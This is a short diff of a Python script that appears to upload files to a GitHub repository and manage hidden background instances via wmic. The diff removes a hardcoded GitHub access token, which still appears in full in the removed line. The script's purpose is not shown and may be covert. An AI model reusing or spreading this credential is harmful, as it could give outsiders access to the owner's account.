@@ -16,11 +16,12 @@ DEVICE_NAME = socket.gethostname()
 SAVE_DIR = r"D:\AppDataLogs\Cache"
 os.makedirs(SAVE_DIR, exist_ok=True)
 
+# 动态接收配置，不硬编码 Token
 GITHUB_CONFIG = {
     "username": "Bei18",
     "repo_name": "my-python-storage",
     "file_path": "main_logic.py",
-    "token": "github_pat_11CJ6CNNQ0XeFgza4F9cud_PlxsXOWgbrLwKqoMCXpxryGk6x2aPJWw36m5G26Pih2QZHXPSF4pv",
+    "token": "",
 }
 
 uploaded_files = set()
@@ -30,7 +31,6 @@ running_listeners = []
 def kill_previous_instances():
     try:
         current_pid = os.getpid()
-
         cmd_wmic = 'wmic process where "commandline like \'%_remote_main_cache%\'" get processid'
         output_wmic = subprocess.check_output(cmd_wmic, shell=True, encoding='utf-8', errors='ignore')
         for line in output_wmic.splitlines():
